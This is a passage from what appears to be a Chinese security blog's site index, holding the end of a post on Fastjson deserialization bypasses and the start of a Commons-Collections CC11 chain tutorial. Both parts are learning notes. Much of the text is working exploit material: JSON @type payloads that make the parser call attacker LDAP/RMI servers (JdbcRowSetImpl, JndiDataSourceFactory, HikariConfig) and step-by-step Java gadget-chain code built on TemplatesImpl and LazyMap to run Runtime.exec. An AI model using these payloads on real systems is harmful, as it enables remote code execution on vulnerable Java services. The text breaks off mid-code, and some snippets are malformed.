.6215344396105674457540x154b6cb22d294cfaLorg.apache.ibatis.reflection.1.2.6218180893084933703940x193b2697eaaed41aLorg.h2.server.1.2.6221646967230692878540x1e0a8c3358ff3daeLorg.apache.ibatis.datasource.1.2.6226534536299297705690x24d2f6048fef4e49Lorg.objectweb.asm.1.2.6228364312547378911130x275d0732b877af29Lflex.messaging.util.concurrent.1.2.6230894514601015278570x2adfefbbfe29d931Lorg.apache.ibatis.javassist.1.2.6237183526611241366810x339a3e0b6beebee9Lorg.apache.ibatis.ognl.1.2.6240461903615206716430x3826f4b2380c8b9bLcom.mysql.cj.jdbc.MysqlConnectionPoolDataSource1.2.6262803579609592176600x5728504a6d454ffcLorg.apache.ibatis.scripting.1.2.6267342403264340962460x5d74d3e5b9370476Lcom.mysql.cj.jdbc.MysqlXADataSource1.2.6271233268972945070600x62db241274397c34Lorg.apache.commons.collections.functors.1.2.6284882660053366251070x75cc60f5871d0fd3Lorg.apache.commons.configuration\n\n目前未知的哈希黑名单：\n\n\n\nversion\nhash\nhex-hash\nname\n\n\n\n\n1.2.42\n33238344207745342\n0x761619136cc13eL\n\n\n\n1.2.62\n-6316154655839304624\n0xa85882ce1044c450L\n\n\n\n1.2.62\n-5472097725414717105\n0xb40f341c746ec94fL\n\n\n\n1.2.62\n-4608341446948126581\n0xc00be1debaf2808bL\n\n\n\n1.2.62\n3256258368248066264\n0x2d308dbbc851b0d8L\n\n\n\n1.2.62\n4841947709850912914\n0x43320dc9d2ae0892L\n\n\n\n1.2.62\n6534946468240507089\n0x5ab0cb3071ab40d1L\n\n\n\n\n\n0x04 1.2.25 - 1.2.41 补丁绕过EXP本地的 Fastjson 版本是 1.2.41，我们可以先试一试之前用的 EXP，情况会怎么样。\n\n\n看到这里，黑名单里面，被 ban 了。\n看了别人的 payload，意思是简单绕过，既然 sun 包里面的这个 JdbcRowSetImpl 类被 ban 了，尝试在 com.sun.rowset.JdbcRowSetImpl 前面加一个 L，结尾加上 ; 绕过\n\n然后开启 AutoTypeSupport\n\nEXP 如下\nimport com.alibaba.fastjson.JSON;  \nimport com.alibaba.fastjson.parser.ParserConfig;  \n  \npublic class SuccessBypassEXP &#123;  \n    public static void main(String[] args) &#123;  \n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  \n String payload =\"&#123;\\\"@type\\\":\\\"Lcom.sun.rowset.JdbcRowSetImpl;\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1234/ExportObject\\\",\\\"autoCommit\\\":\\\"true\\\" &#125;\";  \n JSON.parse(payload);  \n &#125;  \n&#125;\n\n\n\n调试分析我们注意到，PoC和之前的不同之处在于在”com.sun.rowset.JdbcRowSetImpl”类名的前面加了”L”、后面加了”;”就绕过了黑名单过滤。\n下面我们调试分析看看为啥会绕过。首先要知道一点，Lcom.sun.rowset.JdbcRowSetImpl; 这个类其实是不存在的。\n\n断点下在 ParseConfig 的 checkAutoType() 方法\n\n\n\n开始调试，先一路进到这个地方，就是我们前文所说的黑名单了。\n\n\n继续往里走，它会判断我们 @type 类是否为黑名单那里面的类。这里会循环很久，可以直接跳出来，继续往下走。\n然后会走到一个特别重要与核心的方法 ————loadClass()，它隶属的类是 TypeUTtils\n\n\n往下走，有一步语句非常非常关键。\n\n\n意思是，如果我们这个类的起始是 L，结尾是 ;，就把这两个家伙给干掉，变成空白，所以这里返回过来的就是 com.sun.rowset.JdbcRowSetImpl 了，就可以进行我们的恶意利用，这个代码写出来也是有点……\n\n\n0x05 1.2.25-1.2.42 补丁绕过EXPEXP 是这样的\n&#123;\n\t\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\n\t\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \n\t\"autoCommit\":true\n&#125;\n\n这里代码运行的逻辑是，如果还是按照我们的 EXP 写的话，Fastjson 会先行提取 L 和 ;，也就是逻辑不准确，所以我们这里可以直接写两个来绕过。\n\n\n0x06 1.2.25-1.2.43 补丁绕过EXP直接给出payload：\n&#123;\n\t\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;,\n\t\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\n\t\"autoCommit\":true\n&#125;\n\n关键PoC：[com.sun.rowset.JdbcRowSetImpl\n如果我们一开始payload直接这样写是会报错的：\n&#123;\n\t\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\n\t\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\n\t\"autoCommit\":true\n&#125;\n\n报错信息如下，显示期待在42列的位置接受个”[“符号，而42列正好是第一个逗号”,”前一个位置：\nException in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &#39;[&#39;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;\n\n因此改下payload，在第一个逗号前面加个”[“：\n&#123;\n\t\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;,\n\t\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\n\t\"autoCommit\":true\n&#125;\n\n继续报错，显示期待在43列的位置接受个”{“符号，而43列正好是紧跟在新加的”[“字符的后一个位置：\n\n\n调试分析调试发现，在checkAutoType()函数中，修改的是直接对类名以”LL”开头的直接报错：\n\n\n但是以 ”[“开头的类名自然能成功绕过上述校验以及黑名单过滤。\n继续往下调试，在TypeUtils.loadClass()函数中，除了前面看到的判断是否以”L”开头、以”;”结尾的if判断语句外，在其前面还有一个判断是否以”[“开头的if判断语句，是的话就提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类：\n\n\n解析完返回的类名是”[com.sun.rowset.JdbcRowSetImpl”，通过checkAutoType()函数检测之后，到后面就是读该类进行反序列化了：\n\n\n在反序列化中，调用了DefaultJSONParser.parseArray()函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”[“、”&#123;“等，前面一开始尝试的几个payload报错的原因正是出在这里：\n\n\n把这些条件一一满足后，就能成功利用了\n0x07 1.2.25-1.2.45补丁绕过绕过利用 EXP前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。\n直接给出payload，要连LDAP或RMI都可以：\n&#123;\n\t\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n\t\"properties\":\n\t&#123;\n\t\t\"data_source\":\"ldap://localhost:1389/Exploit\"\n\t&#125;\n&#125;\n\n关键PoC：org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\n主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.46的版本中可以看到：\nversionhashhex-hashname1.2.46-80835148884603758840x8fd1960988bce8b4Lorg.apache.ibatis.datasource\n\n\nEXP 如下\nimport com.alibaba.fastjson.JSON;  \nimport com.alibaba.fastjson.parser.ParserConfig;  \n  \n// Fastjson 1.2.41 版本的绕过  \npublic class SuccessBypassEXP_45 &#123;  \n    public static void main(String[] args) &#123;  \n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  \n String payload =\"&#123;\\\"@type\\\":\\\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\\",\" +  \n                \"\\\"properties\\\":&#123;\\\"data_source\\\":\\\"ldap://localhost:1234/Exploit\\\"&#125;&#125;\";  \n JSON.parse(payload);  \n &#125;  \n&#125;\n\n成功\n\n调试分析调试checkAutoType()函数，看到对前一个补丁绕过方法的”[“字符进行了过滤，只要类名以”[“开头就直接抛出异常：\n\n\n后面由于”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”不在黑名单中，因此能成功绕过checkAutoType()函数的检测。\n继续往下调试分析org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这条利用链的原理。\n由于payload中设置了properties属性值，且JndiDataSourceFactory.setProperties()方法满足之前说的Fastjson会自动调用的setter方法的条件，因此可被利用来进行Fastjson反序列化漏洞的利用。\n直接在该setter方法打断点，可以看到会调用到这来，这里就是熟悉的JNDI注入漏洞了，即InitialContext.lookup()，其中参数由我们输入的properties属性中的data_source值获取的：\n\n\n之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。\n0x08 1.2.25-1.2.47补丁绕过EXP本次Fastjson反序列化漏洞也是基于checkAutoType()函数绕过的，并且无需开启AutoTypeSupport，大大提高了成功利用的概率。\n绕过的大体思路是通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。\nDemo如下，无需开启AutoTypeSupport，本地Fastjson用的是1.2.47版本：\nEXP 如下\nimport com.alibaba.fastjson.JSON;\n \npublic class JdbcRowSetImplPoc &#123;\n    public static void main(String[] argv)&#123;\n        String payload  = \"&#123;\\\"a\\\":&#123;\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"&#125;,\"\n                + \"\\\"b\\\":&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\"\n                + \"\\\"dataSourceName\\\":\\\"ldap://localhost:1389/Exploit\\\",\\\"autoCommit\\\":true&#125;&#125;\";\n        JSON.parse(payload);\n    &#125;\n&#125;\n\n成功\n\n\n调试分析实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。\n但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：\n\n1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；\n1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；\n\n在调用DefaultJSONParser.parserObject()函数时，其会对JSON数据进行循环遍历扫描解析。\n在第一次扫描解析中，进行checkAutoType()函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，该类在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回：\n\n\n往下调试，调用到MiscCodec.deserialze()，其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量：\n\n\n\n\n接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类：\n\n\n在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中：\n\n\n在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测：\n\n\n\n补丁分析由于1.2.47这个洞能够在不开启AutoTypeSupport实现RCE，因此危害十分巨大，看看是怎样修的。1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。\n调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。\n1.2.48版本：\n\n\n1.2.47版本：\n\n\n导致目标类并不能缓存到Map中了：\n\n\n因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用TypeUtils.getClassFromMapping()来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉：\n\n\n0x09 Fastjson &lt;&#x3D; 1.2.61 通杀Fastjson1.2.5 &lt;&#x3D; 1.2.59需要开启AutoType\n&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"&#125;\n&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"&#125;\n\nFastjson1.2.5 &lt;&#x3D; 1.2.60无需开启 autoType：\n&#123;\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"rmi://10.10.20.166:1099/ExportObject\"&#125;\n\n&#123;\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://10.10.20.166:1389/ExportObject\"&#125;\n\nFastjson1.2.5 &lt;&#x3D; 1.2.61&#123;\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:1389/Exploi\n\n0x10 小结有点 CTF 那味儿了哈哈\n参考资料Fastjson系列三——历史版本补丁绕过（需开启AutoType） [ Mi1k7ea ]\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Commons-Collections篇09-CC11链","url":"/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/","content":"CC11链\n\nJava 反序列化 Commons-Collections 篇 09-CC11 链0x01 前言原本 CC 链子从 1-7 学完就可以了，最近木爷的博客修好了，木爷在 Shiro-550 的文章里面提及了这一条链子，就顺便自己也学一学。\n\n同样，就看 yso 的链子，看一看自己可不可以完全成功地写出 EXP 来。\n\n0x02 环境搭建\nCommonsCollections 3.1-3.2.1\njdk 版本无限制，我这里用的是 jdk8u65 的\n\n一些细致的环境搭建可以参考我 CC 链的第一篇文章。\nJava反序列化Commons-Collections篇01-CC1链\n0x03 CC11 链分析写在分析前的一些话木头师傅说是 CC2 + CC6 的结合体，也有 qax 的一篇文章说除了 CC1-7 的链子，剩下的链子都可以通过结合产生 CC-N，这里我也把 CC2 与 CC6 的流程图放上来。\n\nTemplatesImpl 解析与利用\n在之前的 Java反序列化基础篇-05-类的动态加载 文章当中，我们讲到了一种利用 利用 ClassLoader#defineClass 直接加载字节码的手段。\n\n在这一条小链子当中，流程图可以绘制如下。\n\n\n这里我们可以正向看，首先是 loadClass()，它的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass()。\n对于 findClass() 方法\n\n根据名称或位置加载 .class 字节码,然后使用 defineClass，代码实例如下。\n通常由子类去实现\n\nprotected Class&lt;?> findClass(String name) throws ClassNotFoundException &#123;\n    throw new ClassNotFoundException(name);\n&#125;\n\n// findClass 方法的源代码\n\nclass NetworkClassLoader extends ClassLoader &#123;\n        String host;\n        int port;\n\n         public Class findClass(String name) &#123;\n            byte[] b = loadClassData(name);\n             return defineClass(name, b, 0, b.length);\n         &#125;\n\n         private byte[] loadClassData(String name) &#123;\n             // load the class data from the connection\n         &#125;\n&#125;\n// 子类的实现方式\n\n\ndefineClass() 的作用是处理前面传入的字节码，将其处理成真正的 Java 类。\n\n\n此时的 defineClass() 方法是有局限性的，因为它只是加载类，并不执行类。若需要执行，则需要先进行 newInstance() 的实例化。\n\n现在我们的 defineClass() 方法的作用域为 protected，我们需要找到作用域为 public 的类，方便我们利用。照样 find usages\n在 TemplatesImpl 类的 static class TransletClassLoader 中找到了我们能够运用的类。\n\n\n这里的 defineClass() 方法没有标注作用域，默认为 defalut，也就是说自己的类里面可以调用，我们继续 find usages\n\n\n因为作用域是 private，所以我们看一看谁调用了 defineTransletClasses() 方法\n\n这里还有一点需要注意的，_bytecodes 的值不能为 null，否则会抛出异常。\n\n\n\n还是同一个类下的 getTransletInstance() 方法调用了 defineTransletClasses() 方法，并且这里有一个 newInstance() 实例化的过程，如果能走完这个函数那么就能动态执行代码，但是因为它是私有的，所以继续找。\n\n\n\n找到了一个 public 的方法，接下来我们开始利用。\n\n1. 利用逻辑在分析过程我们说到只要走过 getTransletInstance() 方法即可，因为这个方法内调用了 newInstance() 方法，用伪代码来表示的话如下。\nTemplatesImpl templates = new TemplatesImpl();\ntemplates.newTransformer();  // 因为是一层层调用的，我们需要后续赋值\n\n\n如果没有一堆限制条件，我们现在的这两行代码就可以进行命令执行了。这里的限制条件指的是类似于下图的这一些。\n\n\n\n如果此处的 _name 为 null，则后续的代码都不执行，也到不了我们调用 newInstance() 实例化的地方。\n并且这里我们需要让 _classs 的值为空，才能进入调用 newInstance()\n这些便是限制条件\n2. 分析限制条件并编写 EXP\n这里的 TemplatesImpl 是可以进行序列化的，所以这里我们使用反射修改其值。\n\n\n\n先列举一些需要我们进行赋值的属性值，用反射修改属性值。赋值这里需要”对症下药”，也就是需要什么类型的值，我们就给什么类型。\n\n\n_class 的值应当为 null，我们去看 TemplatesImpl 的构造方法中没有给 _class 赋初值，所以不用管它。\n_name 的值，这里需要的是 String，所以我们简单赋个 String 即可。\n\n_bytecodes 这里比较难，我们过一遍。\n\n_bytecodes 的值，这里需要的是一个二维数组，所以我们创建一个二维数组。但是 _bytecodes 作为传递进 defineClass 方法的值是一个一维数组。而这个一维数组里面我们需要存放恶意的字节码。这一段伪代码可以这样写。\n在写这段小 poc 之前，要先写一个 Calc.class 的恶意类并编译。\nimport java.io.IOException;  \n  \npublic class Calc &#123;  \n    static &#123;  \n        try &#123;  \n            Runtime.getRuntime().exec(\"calc\");  \n &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n&#125;\n\n直接编写静态代码块就可以了，因为在类初始化的时候会自动执行代码。\nbyte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \nbyte[][] codes = &#123;evil&#125;;\n\n\n_tfactory 这里比较难，我们也过一遍，这两个过完之后，写其他的就没什么问题了。\n\n_tfactory 的值在 TemplatesImpl 这一类中被定义如下，关键字是 transient，这就导致了这个变量在序列化之后无法被访问。\nprivate transient TransformerFactoryImpl _tfactory = null;\n\n直接修改是不行的，但是我们这里的利用要求比较低，只要让 _tfactory 不为 null 即可，我们去看一看 _tfactory 的其他定义如何。\n在 readObject() 方法中，找到了 _tfactory 的初始化定义。\n\n\n所以这里直接在反射中将其赋值为 TransformerFactortImpl 即可，伪代码如下。\nField tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \ntfactoryField.setAccessible(true);  \ntfactoryField.set(templates, new TransformerFactoryImpl());\n\n\n最终完整的 EXP 应该如下\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \n  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \n  \n// TemplatesImpl 的 EXP 编写  \npublic class TemplatesImplEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n templates.newTransformer();  \n &#125;  \n&#125;\n\n解决报错，挖 0day 的必经之路！\n按照道理来说，上面的 EXP 已经挺完美的了，但是在运行的时候我不但没有弹出计算器，反而还报错了。\n\n\n\n这里报错是由于空指针报错，我们去 TemplatesImpl 下打断点调试一下。\n我是在 393 行 if (_bytecodes == null) 那里打断点的。调试之后发现问题出在这儿。\n\n\n\n418 行，判断在 defineClass() 方法中传进去的参数 b 数组的字节码是否继承了 ABSTRACT_TRANSLET 这个父类，如果没有则抛出异常，所以我们需要去恶意类中继承 ABSTRACT_TRANSLET 这个父类。\n\n或者我们可以将 _auxClasse 赋值，使其不为 null。但是如果没有继承 ABSTRACT_TRANSLET 这个父类，会导致 _transletIndex 的值为 -1，在第 426 行的判断当中跳出程序。\n\n修改完毕之后，我们的弹计算器就成功了。\n\n\n\n\n前半段 CC6 链解析后半段链子和 CC6 的链子是一样的，但我们还是来分析一遍。尾部这里是 InvokerTransformer.transform()，所以我们从这里开始找起。\n\n去到 InvokerTransformer 下的 transform() 方法，发现确实存在命令执行的特性，我们去找一找谁调用了 transform() 方法。\n\n\n\n发现是 LazyMap.get() 调用了 transform() 方法，参数是 factory，这个 factory 的变量我们到时候可以通过反射修改。\n\n\n然后去找谁调用了 get() 方法，这里应该挺难找的，就直接跟着赛博鼠师傅的链子走，是 TiedMapEntry.getValue() 调用了 get() 方法\n\n\n接着，在同个类里面找到了 hashCode() 方法调用了 getValue() 方法。这里 hashCode() 和 toString() 应该都是可以的，因为都是广泛的函数，最后跟着链子走，具体就不分析了。具体详见Java反序列化Commons-Collections篇03-CC6链\n这其实就是 CC6 的链子，我看其他师傅的文章，因为 CC2 + CC6 组成的链子能够在 Transformer[] 被禁用的时候很好的进行代码执行。\n0x04 逐步编写 EXP\n从后往前写，一步步验证一下自己写的是否正确。\n\n尾部 TemplatesImpl 链首先，编写一个恶意类，然后将其放到容易找到的地方。恶意类编写如下\nimport java.io.IOException;  \n  \npublic class Calc &#123;&#125; \n    static &#123; \n        try &#123; \n            Runtime.getRuntime().exec(\"calc\");  \n\t\t&#125; catch (IOException e)&#123;\n            e.printStackTrace();  \n\t\t&#125;  \n\t&#125;\n&#125;\n\n\n我们 TemplatesImpl 的 Exp 如下\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.InstantiateTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \n  \nimport javax.xml.transform.Templates;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \n  \n// CC2 的后半段链子 Implpublic class TemplatesImplEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n templates.newTransformer();  \n &#125;  \n&#125;\n\n\n成功弹出计算器\n\n然后我们写 InvokerTransformer.transform() 执行 TemplatesImpl 的 EXP\n因为最后一句语句 templates.newTransformer(); 是来命令执行的，先把其注释掉，逐步编写 EXP\n2. 找链子\n根据 ysoSerial 官方的链子，是 TiedMapEntry 类中的 getValue() 方法调用了 LazyMap 的 get() 方法。\n\n\n\n这里先重新写一遍 LazyMap 类调用计算器的 EXP，这种 EXP 是不嫌多的，多写一写能让自己更加熟练。\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.lang.reflect.Field;  \nimport java.lang.reflect.Method;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class LazyMapEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(templates),  \n new InvokerTransformer(\"newTransformer\", null, null)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  \n Class&lt;LazyMap> lazyMapClass = LazyMap.class;  \n Method lazyGetMethod = lazyMapClass.getDeclaredMethod(\"get\", Object.class);  \n lazyGetMethod.setAccessible(true);  \n lazyGetMethod.invoke(lazyMap, chainedTransformer);  \n  \n &#125;  \n&#125;\n链子的下一步是，TiedMapEntry 类中的 getValue() 方法调用了 LazyMap 的 get() 方法。我们用 TiedMapEntry 写一个 EXP，确保这条链子是能用的。\n\n因为 TiedMapEntry 是作用域是 public，所以我们不需要反射获取它的方法，可以直接调用并修改。\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class LazyMapEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //    templates.newTransformer();  \nTransformer[] transformers = new Transformer[]&#123;  \n        new ConstantTransformer(templates),  \n new InvokerTransformer(\"newTransformer\", null, null)  \n&#125;; \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n tiedMapEntry.getValue();  \n &#125;  \n&#125;\n\n\n成功弹出计算器\n\n\n\n\n这里的逻辑还是很简单的，直接 new 一个 TiedMapEntry 对象，并调用它的 getValue() 方法即可，它的 getValue 方法会去调用 map.get(key) 方法。\n\n\n\n现在我们确保了 TiedMapEntry 这一段链子的可用性，往上去找谁调用了 TiedMapEntry 中的 getValue() 方法。\n\n寻找的方法也略提一嘴，因为 getValue() 这一个方法是相当相当常见的，所以我们一般会优先找同一类下是否存在调用情况。\n\n寻找到同名函数下的 hashCode() 方法调用了 getValue() 方法。\n\n\n如果我们在实战里面，在链子中找到了 hashCode() 方法，说明我们的构造已经可以“半场开香槟”了，\n3. 与入口类结合的整条链子\n前文我们说到链子已经构造到 hashCode() 这里了，这一条 hashCode() 的链子该如何构造呢？\n\n我们去找谁调用了 hashCode() 方法，这里我就直接把答案贴出来吧，因为在 Java 反序列化当中，找到 hashCode() 之后的链子用的基本都是这一条。\nxxx.readObject()\n\tHashMap.put() --自动调用-->   HashMap.hash()\n\t\t后续利用链.hashCode()\n\n更巧的是，这里的 HashMap 类本身就是一个非常完美的入口类。\n\n如果要写一段从 HashMap.put() 开始，到 InvokerTransformer 结尾的弹计算器的 EXP，应当是这样的。\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class HashMapEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n 